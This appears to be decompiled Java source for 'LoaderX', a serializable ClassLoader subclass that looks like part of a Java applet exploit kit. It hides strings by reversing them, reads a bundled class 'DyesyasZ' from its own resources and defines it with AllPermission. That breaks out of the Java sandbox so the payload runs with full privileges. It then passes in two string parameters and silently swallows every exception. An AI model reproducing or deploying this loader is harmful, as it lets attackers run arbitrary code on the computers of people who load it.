// 
// Decompiled by Procyon v0.5.30
// 

package dev.s;

import java.lang.reflect.Field;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.net.URL;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class LoaderX extends ClassLoader implements Serializable
{
    String g5b;
    String o4m;
    String zi4;
    String u4k;
    private static final long serialVersionUID = 6812622870313961944L;
    public static LoaderX instance;
    
    public LoaderX() {
        this.g5b = "ozz";
        this.o4m = "qop";
        this.zi4 = "mkq";
        this.u4k = "poe";
    }
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        LoaderX.instance = this;
        objectInputStream.defaultReadObject();
    }
    
    public void lalafa(final String s, final String s2) throws IOException {
        try {
            final String s3 = "s/ved";
            final String s4 = "ssalc.ZsayseyD/s/ved/";
            final String s5 = "///:elif";
            final String s6 = "atad";
            new StringBuffer(s3).reverse().toString();
            final String string = new StringBuffer(s4).reverse().toString();
            final String string2 = new StringBuffer(s5).reverse().toString();
            final String string3 = new StringBuffer(s6).reverse().toString();
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[8192];
            int read;
            while ((read = this.getClass().getResourceAsStream(string).read(array)) > 0) {
                byteArrayOutputStream.write(array, 0, read);
            }
            final byte[] byteArray = byteArrayOutputStream.toByteArray();
            final Certificate[] array2 = new Certificate[0];
            final Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            final Class<?> defineClass = this.defineClass("dev.s.DyesyasZ", byteArray, 0, byteArray.length, new ProtectionDomain(new CodeSource(new URL(string2), array2), permissions));
            if (defineClass != null) {
                final Field field = defineClass.getField(string3);
                final Field field2 = defineClass.getField("cc");
                final Object instance = defineClass.newInstance();
                field.set(instance, s);
                field2.set(instance, s2);
                defineClass.newInstance();
            }
        }
        catch (Exception ex) {}
    }
    
    static {
        LoaderX.instance = null;
    }
}
